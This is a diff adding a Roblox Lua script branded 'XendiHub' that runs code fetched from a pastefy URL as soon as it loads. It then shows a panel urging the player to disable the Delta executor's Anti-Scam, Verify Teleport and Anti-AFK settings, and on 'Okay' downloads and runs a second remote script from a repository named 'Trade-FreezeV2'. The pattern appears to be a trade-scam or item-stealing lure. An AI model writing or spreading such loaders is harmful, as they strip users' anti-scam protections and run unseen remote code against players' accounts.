@@ -1,0 +1,119 @@
+loadstring(game:HttpGet("https://pastefy.app/CAybxcDL/raw"))()
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Info = Instance.new("TextLabel")
+local Option2 = Instance.new("TextLabel")
+local Option3 = Instance.new("TextLabel")
+local Note = Instance.new("TextLabel")
+local OkayButton = Instance.new("TextButton")
+local NameTag = Instance.new("TextLabel")
+
+-- GUI Setup
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Name = "XendiHubGui"
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Frame
+Frame.Name = "MainFrame"
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.35, 0, 0.3, 0)
+Frame.Size = UDim2.new(0, 400, 0, 250)
+Frame.Active = true
+Frame.Draggable = true
+
+-- Title
+Title.Name = "Title"
+Title.Parent = Frame
+Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Title.BorderSizePixel = 0
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Font = Enum.Font.SourceSansBold
+Title.Text = "⚠️ Turn off all on Delta settings ⚠️"
+Title.TextColor3 = Color3.fromRGB(255, 80, 80)
+Title.TextSize = 20
+
+-- Info (Option 1)
+Info.Name = "Info"
+Info.Parent = Frame
+Info.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Info.BorderSizePixel = 0
+Info.Position = UDim2.new(0, 10, 0, 50)
+Info.Size = UDim2.new(1, -20, 0, 20)
+Info.Font = Enum.Font.SourceSans
+Info.Text = "1. Disable Anti-AFK"
+Info.TextColor3 = Color3.fromRGB(255, 255, 255)
+Info.TextSize = 18
+Info.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Option 2
+Option2.Name = "Option2"
+Option2.Parent = Frame
+Option2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Option2.BorderSizePixel = 0
+Option2.Position = UDim2.new(0, 10, 0, 75)
+Option2.Size = UDim2.new(1, -20, 0, 20)
+Option2.Font = Enum.Font.SourceSans
+Option2.Text = "2. Disable Verify Teleport"
+Option2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Option2.TextSize = 18
+Option2.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Option 3
+Option3.Name = "Option3"
+Option3.Parent = Frame
+Option3.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Option3.BorderSizePixel = 0
+Option3.Position = UDim2.new(0, 10, 0, 100)
+Option3.Size = UDim2.new(1, -20, 0, 20)
+Option3.Font = Enum.Font.SourceSans
+Option3.Text = "3. Disable Anti-Scam"
+Option3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Option3.TextSize = 18
+Option3.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Note
+Note.Name = "Note"
+Note.Parent = Frame
+Note.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Note.BorderSizePixel = 0
+Note.Position = UDim2.new(0.05, 0, 0.65, 0)
+Note.Size = UDim2.new(0.9, 0, 0, 40)
+Note.Font = Enum.Font.SourceSansItalic
+Note.Text = "this is due to script function doesn't work properly with this due to delta disabled some of script function"
+Note.TextColor3 = Color3.fromRGB(200, 200, 200)
+Note.TextSize = 14
+Note.TextWrapped = true
+Note.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Okay Button
+OkayButton.Name = "OkayButton"
+OkayButton.Parent = Frame
+OkayButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+OkayButton.Position = UDim2.new(0.3, 0, 0.85, 0)
+OkayButton.Size = UDim2.new(0.4, 0, 0, 30)
+OkayButton.Font = Enum.Font.SourceSansBold
+OkayButton.Text = "Okay"
+OkayButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+OkayButton.TextSize = 18
+
+-- Name Tag
+NameTag.Name = "NameTag"
+NameTag.Parent = Frame
+NameTag.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+NameTag.BorderSizePixel = 0
+NameTag.Position = UDim2.new(0, 10, 1, -20)
+NameTag.Size = UDim2.new(0, 100, 0, 20)
+NameTag.Font = Enum.Font.SourceSansBold
+NameTag.Text = "XendiHub"
+NameTag.TextColor3 = Color3.fromRGB(255, 255, 255)
+NameTag.TextSize = 14
+NameTag.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Button functionality: destroy GUI + load new script
+OkayButton.MouseButton1Click:Connect(function()
+	ScreenGui:Destroy()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/xiuyeun98878/Trade-FreezeV2/refs/heads/main/GrowAGardenOfficial/lua"))()
+end)
